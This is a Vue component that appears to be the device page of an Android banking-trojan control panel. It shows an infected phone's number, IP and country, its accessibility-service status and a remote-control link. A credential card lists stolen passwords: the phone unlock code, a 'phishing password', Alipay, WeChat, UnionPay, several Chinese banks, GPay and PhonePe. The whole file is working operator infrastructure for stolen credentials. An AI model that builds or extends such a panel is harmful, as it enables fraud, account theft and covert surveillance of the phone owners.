<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { Head, router } from '@inertiajs/vue3';
import {
    NCard,
    NDescriptions,
    NDescriptionsItem,
    NTag,
    NButton,
    NSpace,
    NPopconfirm,
    NProgress,
    NIcon,
    NTooltip,
    NSpin,
    useMessage,
} from 'naive-ui';
import {
    PhonePortraitOutline,
    LocationOutline,
    BatteryChargingOutline,
    BatteryFullOutline,
    BatteryHalfOutline,
    BatteryDeadOutline,
    FlashOutline,
    WifiOutline,
    TimeOutline,
    RefreshOutline,
    GameControllerOutline,
    TrashOutline,
    ArrowBackOutline,
    CheckmarkCircleOutline,
    CloseCircleOutline,
    LockClosedOutline,
    KeyOutline,
} from '@vicons/ionicons5';
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout.vue';
import { useDeviceWebSocket } from '@/composables/useDeviceWebSocket';
import type { PhoneInfo, PasswordData, WebSocketInboundMessage, JoinResponseMessage } from '@/types/websocket';

interface Device {
    id: number;
    uuid: string;
    name: string;
    model: string;
    android_version: string;
    country: string;
    ip_address: string;
    phone_number: string;
    battery_level: number;
    network_type: string;
    is_online: boolean;
    has_accessibility: boolean;
    installed_at: string;
    last_seen_at: string;
    settings: Record<string, any>;
    permissions: Record<string, any>;
}

interface Props {
    device: Device;
    usercheck: string;
}

const props = defineProps<Props>();
const message = useMessage();

// WebSocket 连接
const {
    connectionState,
    lastError,
    deviceStatus,
    isDeviceOnline,
    connect,
    disconnect,
    send,
    onMessage,
} = useDeviceWebSocket();

// 在线状态：优先使用 WebSocket 实时数据，回退到服务器初始数据
// isDeviceOnline 基于 serverToPhone === 'OPEN' 判断
const isOnline = computed(() => {
    // WebSocket 已连接且有设备状态数据时，使用实时状态
    if (deviceStatus.value) {
        return isDeviceOnline.value;
    }
    // 回退到服务器初始数据
    return props.device.is_online;
});

/**
 * 解析电池状态字符串
 * 格式: "{充电状态}~{电量}" 例如 "t~88" 表示充电中，电量88%
 */
const parseBattery = (batteryCharge: string | undefined | null, fallbackLevel: number = 0) => {
    if (!batteryCharge) {
        return { isCharging: false, level: fallbackLevel };
    }
    
    const parts = batteryCharge.split('~');
    if (parts.length === 2) {
        return {
            isCharging: parts[0] === 't',
            level: parseInt(parts[1], 10) || fallbackLevel
        };
    }
    
    // 兼容旧格式（纯数字）
    const level = parseInt(batteryCharge, 10);
    return {
        isCharging: false,
        level: isNaN(level) ? fallbackLevel : level
    };
};

const batteryInfo = computed(() => {
    const wsLevel = deviceStatus.value?.phoneInfo?.battery_charge;
    return parseBattery(wsLevel, props.device.battery_level || 0);
});

const batteryLevel = computed(() => batteryInfo.value.level);

const lastPing = computed(() => {
    return deviceStatus.value?.lastPing || props.device.last_seen_at || '-';
});

const phoneInfo = computed(() => {
    return deviceStatus.value?.phoneInfo || null;
});

const passwords = computed(() => {
    return deviceStatus.value?.passwords || null;
});

const connectionStatusText = computed(() => {
    switch (connectionState.value) {
        case 'connected':
            return '已连接';
        case 'connecting':
            return '连接中...';
        case 'reconnecting':
            return '重连中...';
        default:
            return '未连接';
    }
});

const isConnected = computed(() => connectionState.value === 'connected');
const isInitializing = ref(true);  // 初始化加载状态

// 消息处理器
const handleMessage = (msg: WebSocketInboundMessage) => {
    const msgType = (msg as { type: string }).type;
    if (msgType === 'joinResponse') {
        isInitializing.value = false;
    }
};

// 连接 WebSocket
const handleConnect = () => {
    connect(props.device.uuid, props.usercheck);
};

// 断开 WebSocket
const handleDisconnect = () => {
    disconnect();
};

// 刷新设备状态
const handleRefresh = () => {
    if (isConnected.value) {
        send({
            itype: 'slr_panel',
            subc: 'ping',
            pid: props.device.uuid,
        });
        message.info('正在刷新设备状态...');
    }
};

// 删除设备
const handleDelete = () => {
    router.delete(`/devices/${props.device.uuid}`);
};

// 获取电池颜色
const getBatteryColor = (level: number) => {
    if (level > 60) return '#10B981';
    if (level > 20) return '#F59E0B';
    return '#EF4444';
};

// 根据电量获取图标
const getBatteryIcon = (level: number) => {
    if (level > 60) return BatteryFullOutline;
    if (level > 20) return BatteryHalfOutline;
    return BatteryDeadOutline;
};

// 检查密码是否有值
const hasPasswordData = (value: string | undefined) => {
    return value && value !== '' && value !== '--';
};

// 组件挂载时自动连接
onMounted(() => {
    onMessage(handleMessage);
    handleConnect();
});

// 组件卸载时断开连接
onUnmounted(() => {
    handleDisconnect();
});
</script>

<template>
    <Head :title="`设备: ${device.name}`" />
    <AuthenticatedLayout>
        <template #header-title>
            <div class="header-content">
                <div class="device-header">
                    <div class="device-icon">
                        <NIcon :component="PhonePortraitOutline" size="24" />
                    </div>
                    <div class="device-title">
                        <h1 class="device-name">{{ device.name || '未命名设备' }}</h1>
                        <span class="device-model">{{ device.model }}</span>
                    </div>
                </div>
                <div class="connection-status">
                    <NTag
                        :type="isOnline ? 'success' : 'default'"
                        size="small"
                        round
                    >
                        <template #icon>
                            <NIcon :component="isOnline ? CheckmarkCircleOutline : CloseCircleOutline" />
                        </template>
                        {{ isOnline ? '在线' : '离线' }}
                    </NTag>
                    <NTag
                        :type="isConnected ? 'info' : 'default'"
                        size="small"
                        round
                    >
                        <template #icon>
                            <NIcon :component="WifiOutline" />
                        </template>
                        {{ connectionStatusText }}
                    </NTag>
                </div>
            </div>
        </template>

        <div class="device-show-page">
            <!-- 初始化加载遮罩 -->
            <div v-if="isInitializing" class="initializing-overlay">
                <NSpin size="large" />
                <p class="loading-text">正在连接设备...</p>
            </div>

            <!-- 操作栏 -->
            <div class="action-bar">
                <NSpace>
                    <NButton tag="a" href="/devices" quaternary>
                        <template #icon>
                            <NIcon :component="ArrowBackOutline" />
                        </template>
                        返回列表
                    </NButton>
                </NSpace>
                <NSpace>
                    <NTooltip>
                        <template #trigger>
                            <NButton
                                :disabled="!isConnected"
                                @click="handleRefresh"
                            >
                                <template #icon>
                                    <NIcon :component="RefreshOutline" />
                                </template>
                                刷新状态
                            </NButton>
                        </template>
                        {{ isConnected ? '刷新设备状态' : '请先连接 WebSocket' }}
                    </NTooltip>
                    <NButton
                        v-if="!isConnected"
                        type="primary"
                        @click="handleConnect"
                    >
                        <template #icon>
                            <NIcon :component="WifiOutline" />
                        </template>
                        连接
                    </NButton>
                    <NButton
                        v-else
                        type="warning"
                        ghost
                        @click="handleDisconnect"
                    >
                        断开
                    </NButton>
                    <NButton
                        type="primary"
                        tag="a"
                        :href="`/devices/${device.uuid}/control`"
                    >
                        <template #icon>
                            <NIcon :component="GameControllerOutline" />
                        </template>
                        远程控制
                    </NButton>
                    <NPopconfirm @positive-click="handleDelete">
                        <template #trigger>
                            <NButton type="error" ghost>
                                <template #icon>
                                    <NIcon :component="TrashOutline" />
                                </template>
                                移除设备
                            </NButton>
                        </template>
                        确定要移除此设备吗？此操作不可撤销。
                    </NPopconfirm>
                </NSpace>
            </div>

            <div class="content-grid">
                <!-- 左侧：基本信息 -->
                <div class="info-column">
                    <NCard title="基本信息" size="small">
                        <div class="info-list">
                            <div class="info-row">
                                <span class="info-label">设备名称</span>
                                <span class="info-value">{{ phoneInfo?.phone_name || device.name || '-' }}</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">设备型号</span>
                                <span class="info-value">{{ phoneInfo?.model || device.model || '-' }}</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Android 版本</span>
                                <span class="info-value">{{ phoneInfo?.android_version || device.android_version || '-' }}</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">UUID</span>
                                <code class="info-value code">{{ device.uuid }}</code>
                            </div>
                            <div class="info-row">
                                <span class="info-label">电话号码</span>
                                <span class="info-value">{{ phoneInfo?.phone || device.phone_number || '-' }}</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">国家/地区</span>
                                <span class="info-value">{{ phoneInfo?.country || device.country || '-' }}</span>
                            </div>
                        </div>
                    </NCard>

                    <NCard title="状态信息" size="small">
                        <div class="info-list">
                            <div class="info-row">
                                <span class="info-label">在线状态</span>
                                <NTag :type="isOnline ? 'success' : 'default'" size="small">
                                    {{ isOnline ? '在线' : '离线' }}
                                </NTag>
                            </div>
                            <div class="info-row">
                                <span class="info-label">电池电量</span>
                                <div class="battery-display">
                                    <NIcon 
                                        :component="batteryInfo.isCharging ? BatteryChargingOutline : getBatteryIcon(batteryLevel)" 
                                        size="16" 
                                        :style="{ color: getBatteryColor(batteryLevel) }"
                                    />
                                    <NIcon 
                                        v-if="batteryInfo.isCharging" 
                                        :component="FlashOutline" 
                                        size="14" 
                                        class="charging-icon"
                                    />
                                    <NProgress
                                        type="line"
                                        :percentage="batteryLevel"
                                        :color="getBatteryColor(batteryLevel)"
                                        :rail-color="'#e2e8f0'"
                                        :height="10"
                                        :border-radius="5"
                                        :show-indicator="false"
                                        :processing="batteryInfo.isCharging"
                                        style="width: 80px;"
                                    />
                                    <span class="battery-text">{{ batteryLevel }}%</span>
                                </div>
                            </div>
                            <div class="info-row">
                                <span class="info-label">无障碍服务</span>
                                <NTag
                                    :type="(phoneInfo?.accessibility === '1' || device.has_accessibility) ? 'success' : 'warning'"
                                    size="small"
                                >
                                    {{ (phoneInfo?.accessibility === '1' || device.has_accessibility) ? '已启用' : '未启用' }}
                                </NTag>
                            </div>
                            <div class="info-row">
                                <span class="info-label">IP 地址</span>
                                <span class="info-value">{{ phoneInfo?.ip || device.ip_address || '-' }}</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">最后心跳</span>
                                <span class="info-value time">{{ lastPing }}</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">安装时间</span>
                                <span class="info-value time">{{ phoneInfo?.install_date || device.installed_at || '-' }}</span>
                            </div>
                        </div>
                    </NCard>
                </div>

                <!-- 右侧：密码信息 -->
                <div class="password-column">
                    <NCard size="small">
                        <template #header>
                            <div class="card-header">
                                <NIcon :component="KeyOutline" size="18" />
                                <span>密码信息</span>
                                <NTag
                                    v-if="passwords && Object.values(passwords).some(v => hasPasswordData(v))"
                                    type="success"
                                    size="tiny"
                                >
                                    有数据
                                </NTag>
                            </div>
                        </template>

                        <div v-if="!isConnected" class="no-connection">
                            <NIcon :component="WifiOutline" size="32" class="no-connection-icon" />
                            <p>请连接 WebSocket 获取密码数据</p>
                            <NButton size="small" type="primary" @click="handleConnect">
                                连接
                            </NButton>
                        </div>

                        <div v-else-if="!passwords" class="loading-state">
                            <NSpin size="small" />
                            <p>正在获取密码数据...</p>
                        </div>

                        <div v-else class="password-list">
                            <div class="password-row">
                                <span class="password-label">
                                    <NIcon :component="LockClosedOutline" size="14" />
                                    手机密码
                                </span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.phone) }"
                                >
                                    {{ passwords.phone || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">钓鱼密码</span>
                                <span
                                    class="password-value highlight"
                                    :class="{ 'has-data': hasPasswordData(passwords.phish) }"
                                >
                                    {{ passwords.phish || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">支付宝</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.alipay) }"
                                >
                                    {{ passwords.alipay || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">微信</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.wechat) }"
                                >
                                    {{ passwords.wechat || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">云闪付</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.yun) }"
                                >
                                    {{ passwords.yun || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">建行</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.jian) }"
                                >
                                    {{ passwords.jian || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">邮储</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.you) }"
                                >
                                    {{ passwords.you || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">农行</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.nong) }"
                                >
                                    {{ passwords.nong || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">中行</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.zhong) }"
                                >
                                    {{ passwords.zhong || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">工行</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.gong) }"
                                >
                                    {{ passwords.gong || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">招行</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.zhao) }"
                                >
                                    {{ passwords.zhao || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">GPay</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.gpay) }"
                                >
                                    {{ passwords.gpay || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">PhonePe</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.phonepe) }"
                                >
                                    {{ passwords.phonepe || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">BC</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.bc) }"
                                >
                                    {{ passwords.bc || '--' }}
                                </span>
                            </div>
                            <div class="password-row">
                                <span class="password-label">MB</span>
                                <span
                                    class="password-value"
                                    :class="{ 'has-data': hasPasswordData(passwords.mb) }"
                                >
                                    {{ passwords.mb || '--' }}
                                </span>
                            </div>
                        </div>
                    </NCard>
                </div>
            </div>
        </div>
    </AuthenticatedLayout>
</template>

<style scoped>
.device-show-page {
    padding: 16px;
    max-width: 1200px;
    margin: 0 auto;
    position: relative;
    min-height: 400px;
}

/* 初始化加载遮罩 */
.initializing-overlay {
    position: absolute;
    inset: 0;
    background: rgba(255, 255, 255, 0.95);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 100;
    border-radius: 12px;
}

.loading-text {
    margin-top: 16px;
    color: #64748b;
    font-size: 14px;
}

/* 头部样式 */
.header-content {
    display: flex;
    align-items: center;
    justify-content: space-between;
    width: 100%;
}

.device-header {
    display: flex;
    align-items: center;
    gap: 12px;
}

.device-icon {
    width: 40px;
    height: 40px;
    background: linear-gradient(135deg, #10B981 0%, #059669 100%);
    border-radius: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    box-shadow: 0 2px 8px rgba(16, 185, 129, 0.3);
}

.device-title {
    display: flex;
    flex-direction: column;
}

.device-name {
    font-size: 18px;
    font-weight: 600;
    color: #1e293b;
    margin: 0;
    line-height: 1.2;
}

.device-model {
    font-size: 12px;
    color: #64748b;
}

.connection-status {
    display: flex;
    align-items: center;
    gap: 8px;
}

/* 操作栏 */
.action-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 16px 20px;
    background: white;
    border-radius: 12px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
    margin-bottom: 16px;
}

/* 内容网格 */
.content-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
}

.info-column,
.password-column {
    display: flex;
    flex-direction: column;
    gap: 16px;
}

/* 信息列表 */
.info-list {
    display: flex;
    flex-direction: column;
    gap: 2px;
}

.info-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 0;
    border-bottom: 1px solid #f1f5f9;
}

.info-row:last-child {
    border-bottom: none;
}

.info-label {
    color: #64748b;
    font-size: 13px;
}

.info-value {
    color: #1e293b;
    font-size: 13px;
    font-weight: 500;
    text-align: right;
}

.info-value.code {
    font-family: monospace;
    font-size: 11px;
    background: #f1f5f9;
    padding: 2px 6px;
    border-radius: 4px;
}

.info-value.time {
    font-size: 12px;
    color: #64748b;
}

/* 电池显示 */
.battery-display {
    display: flex;
    align-items: center;
    gap: 8px;
}

.battery-text {
    font-size: 13px;
    font-weight: 500;
    color: #1e293b;
    min-width: 40px;
}

.charging-icon {
    color: #10B981;
    animation: pulse 1.5s ease-in-out infinite;
}

@keyframes pulse {
    0%, 100% {
        opacity: 1;
    }
    50% {
        opacity: 0.5;
    }
}

/* 卡片头部 */
.card-header {
    display: flex;
    align-items: center;
    gap: 8px;
    font-weight: 600;
    font-size: 15px;
    color: #1e293b;
}

/* 密码列表 */
.password-list {
    display: flex;
    flex-direction: column;
    gap: 2px;
}

.password-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 8px 0;
    border-bottom: 1px solid #f1f5f9;
    font-size: 13px;
}

.password-row:last-child {
    border-bottom: none;
}

.password-label {
    display: flex;
    align-items: center;
    gap: 6px;
    color: #64748b;
}

.password-value {
    color: #94a3b8;
    font-family: monospace;
    text-align: right;
}

.password-value.has-data {
    color: #10B981;
    font-weight: 500;
}

.password-value.highlight.has-data {
    color: #F59E0B;
    font-weight: 600;
}

/* 无连接状态 */
.no-connection {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
    color: #94a3b8;
    text-align: center;
}

.no-connection-icon {
    margin-bottom: 12px;
    color: #cbd5e1;
}

.no-connection p {
    margin: 0 0 16px 0;
    font-size: 13px;
}

/* 加载状态 */
.loading-state {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
    color: #94a3b8;
}

.loading-state p {
    margin: 12px 0 0 0;
    font-size: 13px;
}

/* 响应式 */
@media (max-width: 768px) {
    .content-grid {
        grid-template-columns: 1fr;
    }

    .header-content {
        flex-direction: column;
        gap: 12px;
        align-items: flex-start;
    }

    .action-bar {
        flex-direction: column;
        gap: 12px;
        align-items: stretch;
    }
}
</style>
